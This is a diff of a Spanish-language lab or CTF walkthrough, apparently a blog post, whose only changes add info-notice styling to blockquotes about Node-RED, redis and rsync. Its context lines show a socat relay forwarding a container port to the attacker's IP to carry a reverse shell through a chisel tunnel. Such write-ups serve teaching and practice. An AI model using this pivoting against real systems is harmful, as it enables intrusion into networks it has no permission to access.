@@ -134,6 +134,7 @@ Nos envía un JSON con una serie de datos, un `id`, `IP` y `path`, si navegamos 
 Vemos una interfaz donde podemos arrastrar nodos y crear diagramas de flujo, por el título podemos identificar la tecnología `Node-RED`
 
 > Node-RED es una **herramienta de programación visual basada en flujo, ideal para conectar dispositivos, APIs y servicios web**. Permite construir aplicaciones sin necesidad de escribir código, utilizando un editor gráfico basado en navegador donde se conectan nodos predefinidos.
+{: .notice--info}
 <br>
 
 
@@ -782,6 +783,7 @@ Además cada vez que recargamos la página, podemos notar en la consola del nave
 ## `redis` Analysis - `www`
 
 > Redis es un sistema de almacenamiento de datos de clave/valor en memoria, de código abierto, que -se utiliza principalmente como caché o como base de datos de respuesta rápida.
+{: .notice--info}
 
 Si nos conectamos al puerto `6379`, podremos utilizar el servicio `redis` de la IP `172.19.0.2`, en el siguiente enlace podemos encontrar una guía para hacer pentesting a esta tecnología
 
@@ -902,6 +904,7 @@ OK
 Nuestra IP no es alcanzable desde esta nueva máquina, necesitaremos utilizar el túnel que establecimos con `chisel`, sin embargo, para poder establecer una reverse shell necesitamos que `172.19.0.3` conozca un camino hasta nuestra IP.
 
 > Reenviaremos todo el tráfico entrante desde el puerto `1111` de este contenedor a nuestra IP por el puerto `2222` con la ayuda de `socat`
+{: .notice--info}
 
 ~~~ bash
 root@nodered:/tmp# ./socat TCP-LISTEN:1111,fork TCP10.10.14.12:2222 &
@@ -1218,6 +1221,7 @@ Actualicemos el mapeo de las redes internas para no confundirnos
 ## Abusing `rsync`
 
 >Rsync es una **herramienta de línea de comandos para la sincronización de archivos y directorios, tanto local como remota**, que permite transferir datos de forma eficiente y rápida.
+{: .notice--info}
 
 Podemos cargar archivos de la máquina `backup` mediante el uso de `rsync`, que es la función principal de `rsync`
 
